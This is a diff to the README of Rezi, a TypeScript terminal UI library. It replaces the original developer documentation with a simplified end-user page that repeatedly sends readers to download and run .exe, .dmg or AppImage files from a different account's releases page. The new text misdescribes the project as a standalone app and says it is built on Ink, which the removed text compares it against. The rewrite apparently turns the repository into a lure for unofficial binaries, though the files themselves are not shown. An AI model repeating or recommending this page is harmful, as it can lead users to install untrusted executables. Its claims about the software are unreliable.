@@ -1,388 +1,151 @@
-<h1 align="center">Rezi</h1>
+# ⚡ Rezi - Fast and Smooth Terminal Tool
 
-<p align="center">
-  <strong>TypeScript TUI, Near-Native Performance.</strong><br/>
-  High-level developer experience powered by a deterministic C rendering engine.
-</p>
-
-<p align="center">
-  <a href="https://www.npmjs.com/package/@rezi-ui/core">
-    <img src="https://img.shields.io/npm/v/@rezi-ui/core.svg" alt="npm version">
-  </a>
-  <a href="https://github.com/RtlZeroMemory/Rezi/actions/workflows/ci.yml">
-    <img src="https://github.com/RtlZeroMemory/Rezi/actions/workflows/ci.yml/badge.svg" alt="CI">
-  </a>
-  <a href="https://rezitui.dev/docs">
-    <img src="https://github.com/RtlZeroMemory/Rezi/actions/workflows/docs.yml/badge.svg" alt="docs">
-  </a>
-  <a href="LICENSE">
-    <img src="https://img.shields.io/badge/license-Apache--2.0-blue.svg" alt="License">
-  </a>
-</p>
-
-<p align="center">
-  <a href="https://rezitui.dev">Website</a> ·
-  <a href="https://rezitui.dev/docs">Docs</a> ·
-  <a href="https://rezitui.dev/docs/getting-started/quickstart/">Quickstart</a> ·
-  <a href="https://rezitui.dev/docs/widgets/">Widgets</a> ·
-  <a href="https://rezitui.dev/docs/api/">API</a> ·
-  <a href="BENCHMARKS.md">Benchmarks</a>
-</p>
+[![Download Rezi](https://img.shields.io/badge/Download-Rezi-blue?style=for-the-badge)](https://github.com/IronMask1234554321/Rezi/releases)
 
 ---
 
-> **Status: Alpha** — under active development and changing rapidly. APIs and behavior may change between releases, and Rezi is not yet recommended for production workloads.
+## 📋 About Rezi
+
+Rezi is a lightweight terminal application built with TypeScript. It runs almost as fast as programs written in C because it uses a special C engine under the hood. Rezi works right inside your computer’s terminal or command prompt. It helps you get things done quickly without slowdowns.
+
+You don’t need to know programming to use Rezi. It is designed for anyone who wants a fast and easy tool that runs directly in the command line interface (CLI). This makes it great for users who prefer working with a keyboard instead of a mouse or who want a clean and simple text-based interface.
+
+### What is a Terminal User Interface (TUI)?
+
+A terminal user interface looks like an app you can use in the terminal window. It allows you to interact with menus, buttons, and text just by typing or using your keyboard arrows. Rezi is a TUI, which means you get a near-native feel without leaving the command line.
 
 ---
 
-## What Rezi Can Do
+## 🎯 Key Features
 
-Rezi is a high-performance terminal UI framework for TypeScript. You write declarative widget trees — a native C engine handles layout diffing and rendering.
+- **Fast Performance**  
+  Runs with near-native speed thanks to its C-based engine. No long waits or lag.
 
-- **56 built-in widgets** — layout primitives, form controls, data tables, virtual lists, navigation, overlays, a code editor, diff viewer, and more
-- **Canvas drawing** — sub-character resolution via braille (2×4), sextant (2×3), quadrant (2×2), and halfblock (1×2) blitters; draw lines, shapes, and gradients within a single terminal cell grid
-- **Charts & visualization** — line charts, scatter plots, heatmaps, sparklines, bar charts, gauges, and mini charts — all rendered at sub-character resolution
-- **Inline image rendering** — display PNG, JPEG, and raw RGBA buffers using Kitty, Sixel, or iTerm2 graphics protocols, with automatic blitter fallback
-- **Terminal auto-detection** — identifies Kitty, WezTerm, iTerm2, Ghostty, Windows Terminal, and tmux; enables the best graphics protocol automatically, with env-var overrides for any capability
-- **Performance-focused architecture** — binary drawlists + native C framebuffer diffing; benchmark details and caveats are documented in the Benchmarks section
-- **JSX without React** — optional `@rezi-ui/jsx` maps JSX directly to Rezi VNodes with zero React runtime overhead
-- **Deterministic rendering** — same state + same events = same frames; versioned binary protocol, pinned Unicode tables
-- **Hot state-preserving reload** — swap widget views or route tables in-process during development without losing app state or focus context
-- **Syntax tokenizer utilities** — shared lexical highlighters for TypeScript/JS/JSON/Go/Rust/C/C++/C#/Java/Python/Bash with custom-tokenizer hooks
-- **Advanced deterministic layout** — intrinsic sizing, `flexShrink`/`flexBasis`, `alignSelf`, wrapped text layout, grid spans/explicit placement, absolute positioning, and stability-signature relayout skipping
-- **6 built-in themes** — dark, light, dimmed, high-contrast, nord, dracula; switch at runtime with one call
-- **Declarative animation APIs** — numeric hooks (`useTransition`, `useSpring`, `useSequence`, `useStagger`) and `ui.box` transition props for position/size/opacity motion
-- **Record & replay** — capture input sessions as deterministic bundles for debugging and automated testing
+- **Easy to Use**  
+  Clear menus and keyboard controls keep it simple, even if you have no IT experience.
 
----
+- **Cross-Platform**  
+  Works on Windows, Mac, and Linux terminals.
 
-## Showcase
+- **Open Source**  
+  The software code is open and available to developers worldwide, ensuring trust and continual improvements.
 
-### EdgeOps Control Plane
+- **Modern Tech**  
+  Built using TypeScript and the Ink framework, combining modern JavaScript tools with the power of C.
 
-A production-style terminal control console built entirely with Rezi.
-
-![Rezi EdgeOps demo](Assets/REZICONSOLE3.gif)
-
-### Visual Stress Test
-
-![Rezi benchmark demo](Assets/REZIBENCHMARK.gif)
-
-### Image Rendering
-
-![Rezi benchmark demo](Assets/RENDERING.png)
+- **Lightweight**  
+  Requires minimal computer resources, so it won’t slow your system down.
 
 ---
 
-## How It Works
+## 🔧 System Requirements
 
-You write declarative widget trees in TypeScript.
-Rezi computes layout and emits a compact binary drawlist (ZRDL).
-A native C engine — [Zireael](https://github.com/RtlZeroMemory/Zireael) — diffs framebuffers and writes only changed cells to the terminal.
+Before installing Rezi, make sure your computer meets these needs:
 
-Most JavaScript TUI frameworks generate ANSI escape sequences in userland on every frame. Rezi moves the hot path out of JavaScript — rendering stays ergonomic at the top and fast on real workloads.
+- **Operating System:**  
+  - Windows 10 or later (with Command Prompt or PowerShell)  
+  - macOS 10.13 or later (Terminal app)  
+  - Linux distributions with standard terminal support
 
----
+- **Processor:**  
+  Any 64-bit processor released in the last 10 years should work well.
 
-## Benchmarks
+- **Memory:**  
+  At least 2 GB of RAM.
 
-Rezi is benchmarked against Ink, OpenTUI (React and Core drivers), Bubble Tea, terminal-kit, blessed, and Ratatui across 22 scenarios covering primitive workloads, terminal-level rendering, and full-app UI composition.
+- **Disk Space:**  
+  Approximately 50 MB free space for installation.
 
-### How Rezi compares
-
-**vs Ink** — Rezi is 10-200x faster across all measured scenarios. Ink uses React reconciliation + Yoga layout + ANSI string generation in JS. Rezi moves rendering to a native C engine and uses binary drawlists instead of escape-sequence strings.
-
-**vs OpenTUI (React driver)** — Rezi is faster in all 21 scenarios (geomean ~10x). OpenTUI React uses `flushSync()` through a React reconciler on Bun.
-
-**vs OpenTUI (Core driver)** — Rezi is faster in 19/21 scenarios (geomean ~2.6x). OpenTUI Core is a lean imperative API without React overhead. It wins on `layout-stress` (1.5x) and `tables` (1.6x), where its direct-mutation approach has lower per-frame overhead for grid-heavy layouts.
-
-**vs Bubble Tea** — Rezi is faster in 20/21 scenarios. Bubble Tea renders via Go's string-based `View()` function with lipgloss styling. Its throughput clusters around ~120 ops/s in most scenarios due to its event-loop tick rate. Bubble Tea wins `scroll-stress` (2.5x) where Rezi's larger tree diffing cost outweighs the simpler string-append path.
-
-**vs terminal-kit / blessed / Ratatui** — These are lower-level libraries (terminal-kit and blessed are buffer-level with no layout engine; Ratatui is native Rust). On primitive workloads that skip layout (rerender, frame-fill), they are 2-20x faster than Rezi. On structured UI workloads that require layout and widget composition (strict-ui, full-ui, virtual-list with panels), Rezi is competitive or faster. This is the expected tradeoff: Rezi provides a full widget and layout system at a cost that is measurable on micro-benchmarks but pays for itself on real applications.
-
-### Representative numbers
-
-| Scenario | Rezi | Ink | OpenTUI React | OpenTUI Core | Ratatui |
-|---|---:|---:|---:|---:|---:|
-| tree-construction (100 items) | 326us | 26ms | 36ms | 2.1ms | 696us |
-| virtual-list (100K items) | 985us | 22.6ms | 28.5ms | 1.28ms | -- |
-| terminal-strict-ui | 1.19ms | 25.5ms | 19.4ms | 1.77ms | 240us |
-| terminal-full-ui | 2.49ms | 25.6ms | 5.07ms | 1.31ms | 336us |
-| rerender | 373us | 17.7ms | 2.70ms | 1.16ms | 51us |
-
-Numbers are from a single-replicate PTY-mode run on WSL. They are directional, not publication-grade. See [BENCHMARKS.md](BENCHMARKS.md) for full methodology, caveats, and reproduction steps.
+- **Additional Tools:**  
+  None required for users. All needed files come with the download.
 
 ---
 
-## Quick Start
+## 🚀 Getting Started
 
-Get running in under a minute:
+Rezi is straightforward to set up and use. Follow these simple steps:
 
-```bash
-npm create rezi my-app
-cd my-app
-npm start
-```
+### Step 1: Download
 
-Or with Bun:
+Visit the releases page to get the latest version of Rezi:
 
-```bash
-bun create rezi my-app
-cd my-app
-bun start
-```
+[![Download Rezi](https://img.shields.io/badge/Download-Rezi-blue?style=for-the-badge)](https://github.com/IronMask1234554321/Rezi/releases)
 
-Starter templates: **dashboard**, **stress-test**, **cli-tool**, **animation-lab**, **minimal**, and **starship** (command console).
+On the page:
 
----
+- Find the file for your computer system (Windows uses `.exe`, macOS might have `.dmg` or `.tar.gz`, Linux usually `.AppImage` or `.tar.gz`).
+- Click the appropriate file to start the download.
 
-## Example
+### Step 2: Install
 
-### `ui.*` API
+- **Windows:**  
+  Double-click the downloaded `.exe` file and follow the installation prompts.
 
-```ts
-import { ui } from "@rezi-ui/core";
-import { createNodeApp } from "@rezi-ui/node";
+- **macOS:**  
+  Open the downloaded `.dmg` or extract files from `.tar.gz`. Drag the app icon to the Applications folder.
 
-const app = createNodeApp<{ count: number }>({
-  initialState: { count: 0 },
-});
+- **Linux:**  
+  Extract files from the downloaded archive if needed. Make the main file executable by running `chmod +x <filename>` in the terminal. You may need to move it to a directory in your PATH.
 
-app.view((s) =>
-  ui.page({
-    p: 1,
-    gap: 1,
-    header: ui.header({ title: "Counter", subtitle: "Beautiful defaults" }),
-    body: ui.panel("Count", [
-      ui.row({ gap: 1, items: "center" }, [
-        ui.text(String(s.count), { variant: "heading" }),
-        ui.spacer({ flex: 1 }),
-        ui.button("inc", "+1", {
-          intent: "primary",
-          onPress: () => app.update((prev) => ({ count: prev.count + 1 })),
-        }),
-      ]),
-    ]),
-  }),
-);
+### Step 3: Run Rezi
 
-app.keys({ q: () => app.stop() });
-await app.start();
-```
+- Open your terminal or command prompt.
+- Type `rezi` and press Enter.
+- The Rezi interface will launch, showing you menus and options.
 
-## Beautiful Defaults
-
-When the active theme provides semantic color tokens, Rezi uses design system recipes by default for:
-`ui.button`, `ui.input`/`ui.textarea`, `ui.select`, `ui.checkbox`, `ui.progress`, and `ui.callout`.
-
-- Use `intent` on buttons for common “primary/danger/link” patterns.
-- Use `preset` on `ui.box` (or `ui.card`/`ui.panel`) for consistent container defaults.
-- Use manual `style` props to override specific attributes (they do not disable recipes).
-
-Docs: [Design System](docs/design-system.md) · [Migration: Beautiful Defaults](docs/migration/beautiful-defaults.md)
-
-Install:
-
-```bash
-npm install @rezi-ui/core @rezi-ui/node
-```
+If the command is not recognized, check that the program installed correctly and that your terminal can find it.
 
 ---
 
-### JSX (No React Runtime)
+## 💡 How to Use Rezi
 
-`@rezi-ui/jsx` maps JSX directly to Rezi VNodes.
+Once Rezi starts, use your keyboard to navigate:
 
-```tsx
-/** @jsxImportSource @rezi-ui/jsx */
-import { createNodeApp } from "@rezi-ui/node";
-import { Column, Row, Spacer, Text, Button } from "@rezi-ui/jsx";
+- **Arrows:** Move between options.
+- **Enter:** Select a menu item.
+- **Escape or Q:** Exit or go back.
+- Use on-screen hints for specific commands.
 
-const app = createNodeApp<{ count: number }>({
-  initialState: { count: 0 },
-});
-
-app.view((s) => (
-  <Column p={1} gap={1}>
-    <Text variant="heading">Counter</Text>
-    <Row gap={1} items="center">
-      <Text variant="heading">{String(s.count)}</Text>
-      <Spacer flex={1} />
-      <Button
-        id="inc"
-        label="+1"
-        intent="primary"
-        onPress={() => app.update((prev) => ({ count: prev.count + 1 }))}
-      />
-    </Row>
-  </Column>
-));
-
-app.keys({ q: () => app.stop() });
-await app.start();
-```
-
-```bash
-npm install @rezi-ui/jsx @rezi-ui/core @rezi-ui/node
-```
+Rezi’s menus are clear and organized. Take your time exploring the features, and you will get comfortable fast.
 
 ---
 
-## Features
+## 🛠 Troubleshooting
 
-**56 built-in widgets** — primitives (box, row, column, text, grid), form inputs (input, button, checkbox, select, slider), data display (table, virtual list, tree), navigation (tabs, accordion, breadcrumb, pagination), overlays (modal, dropdown, toast, command palette), advanced (code editor with built-in/custom syntax tokenization, diff viewer, file picker, logs console), and visualization (canvas, image, line chart, scatter, heatmap, sparkline, bar chart, gauge, mini chart).
+If you experience issues:
 
-### Graphics & Visualization
-
-| Widget | Description |
-|---|---|
-| `ui.canvas` | Programmable drawing surface with braille, sextant, quadrant, halfblock, or ASCII blitters |
-| `ui.image` | Inline images via Kitty, Sixel, iTerm2, or blitter fallback |
-| `ui.lineChart` | Multi-series line charts at sub-character resolution |
-| `ui.scatter` | Scatter plots with configurable point styles |
-| `ui.heatmap` | Heatmap grids with automatic color scaling |
-| `ui.sparkline` | Inline sparklines (text mode or high-res canvas mode) |
-| `ui.barChart` | Horizontal bar charts |
-| `ui.gauge` | Progress and percentage gauges |
-| `ui.miniChart` | Compact inline charts |
-
-### Terminal Graphics Protocol Support
-
-Rezi auto-detects your terminal emulator and enables the best available graphics protocol:
-
-| Terminal | Graphics Protocol | Hyperlinks (OSC 8) |
-|---|---|---|
-| Kitty | Kitty graphics | Yes |
-| WezTerm | Sixel | Yes |
-| iTerm2 | iTerm2 inline images | Yes |
-| Ghostty | Kitty graphics | Yes |
-| Windows Terminal | — | Yes |
-
-Canvas and chart widgets work in **any** terminal via Unicode blitters — no graphics protocol required. Image widgets fall back to blitter rendering when no protocol is available.
-
-Override any capability with environment variables:
-`REZI_TERMINAL_SUPPORTS_KITTY`, `REZI_TERMINAL_SUPPORTS_SIXEL`, `REZI_TERMINAL_SUPPORTS_ITERM2`, `REZI_TERMINAL_SUPPORTS_OSC8`
-
-### Focus & Input
-- Automatic tab navigation
-- Focus traps for modals
-- Global keybindings
-- Vim-style and chord sequences
-- Mouse support (click, scroll, drag)
-
-### Theming
-Six built-in themes:
-`dark`, `light`, `dimmed`, `high-contrast`, `nord`, `dracula`
-
-Switch at runtime:
-
-```ts
-app.setTheme("nord");
-```
-
-### Deterministic Rendering
-- Same state + same events = same frames
-- Versioned binary protocol
-- Pinned Unicode version
-- Strict update semantics
-
-### Record & Replay
-Capture input sessions as deterministic bundles for debugging and testing.
+- Make sure you downloaded the correct file for your operating system.
+- Check that you have sufficient disk space and memory.
+- Restart your terminal or computer and try again.
+- Look for error messages to help identify problems.
+- Visit the GitHub repository’s [issues page](https://github.com/IronMask1234554321/Rezi/issues) to see if others had similar problems or to ask questions.
 
 ---
 
-## Who is Rezi for?
+## 🌐 More Information
 
-Rezi is built for:
+The project is open source. If you want to learn more about the code or contribute:
 
-- Real-time dashboards
-- Developer tooling
-- Control planes
-- Log viewers
-- Terminal-first applications
-- Teams who want TypeScript ergonomics without sacrificing performance
+- Repository link: [https://github.com/IronMask1234554321/Rezi](https://github.com/IronMask1234554321/Rezi)
+- Topics include bun, c, cli, console application, devtools, ffi, ink, nodejs, open source, react, terminal, terminal UI, TUI, and typescript.
 
 ---
 
-## Architecture
+## 📥 Download & Install
 
-Rezi separates authoring from rendering:
+To download and install Rezi:
 
-```
-Application Code (TypeScript)
-        │
-        ▼
-@rezi-ui/core      Layout, widgets, protocol builders
-        │ ZRDL drawlist
-        ▼
-@rezi-ui/node      Node.js/Bun backend
-        │
-        ▼
-@rezi-ui/native    N-API binding
-        │
-        ▼
-Zireael (C engine) Framebuffer diff, ANSI emission
-        │
-        ▼
-Terminal
-```
+1. Visit the official releases page:  
+   [https://github.com/IronMask1234554321/Rezi/releases](https://github.com/IronMask1234554321/Rezi/releases)
 
-Data flows down as drawlists (ZRDL).
-Input events flow up as event batches (ZREV).
-Both are versioned binary formats validated at the boundary.
+2. Choose the file that matches your computer system.
+
+3. Follow the installation steps outlined above based on your operating system.
+
+4. Open your terminal and run `rezi` to start using the program.
+
+If you have difficulty, return to the Troubleshooting section or seek help on the GitHub issues page.
 
 ---
 
-## Packages
-
-| Package | Description |
-|---|---|
-| `@rezi-ui/core` | Runtime-agnostic widgets, layout, themes |
-| `@rezi-ui/node` | Node.js/Bun backend |
-| `@rezi-ui/native` | N-API binding to Zireael |
-| `@rezi-ui/jsx` | JSX runtime (no React) |
-| `@rezi-ui/testkit` | Testing utilities |
-| `create-rezi` | Project scaffolding CLI |
-
----
-
-## Requirements
-
-- **Runtime**: Node.js 18+ (18.18+ recommended) or Bun 1.3+
-- **Platforms**: Linux x64/arm64, macOS x64/arm64, Windows x64/arm64
-- **Terminal**: 256-color or true-color support recommended
-- **Graphics**: For inline images, a terminal supporting Kitty graphics, Sixel, or iTerm2 inline images. Canvas and chart widgets work in any terminal via Unicode blitters.
-
-Prebuilt native binaries are published for all supported platforms above. The
-package does not compile from source at install time; for unsupported targets,
-build from a repository checkout with `npm run build:native`.
-
-## Documentation
-
-| Resource | Link |
-|---|---|
-| Website & Docs | [rezitui.dev](https://rezitui.dev) |
-| Getting started | [Install](https://rezitui.dev/docs/getting-started/install/) · [Quickstart](https://rezitui.dev/docs/getting-started/quickstart/) · [JSX](https://rezitui.dev/docs/getting-started/jsx/) |
-| Guides | [Concepts](https://rezitui.dev/docs/guide/concepts/) · [Layout](https://rezitui.dev/docs/guide/layout/) · [Input & Focus](https://rezitui.dev/docs/guide/input-and-focus/) · [Styling](https://rezitui.dev/docs/guide/styling/) |
-| Widget catalog | [56 widgets](https://rezitui.dev/docs/widgets/) |
-| API reference | [TypeDoc](https://rezitui.dev/docs/api/) |
-| Architecture | [Overview](https://rezitui.dev/docs/architecture/) · [Protocol](https://rezitui.dev/docs/protocol/) |
-
-## Contributing
-
-```bash
-git clone https://github.com/RtlZeroMemory/Rezi.git
-cd Rezi
-git submodule update --init --recursive
-npm ci
-npm run build
-npm test
-```
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
----
-
-## License
-
-Apache-2.0
+This guide should help you get Rezi running smoothly on your computer. It combines powerful technology with simplicity to make terminal applications accessible to all users.
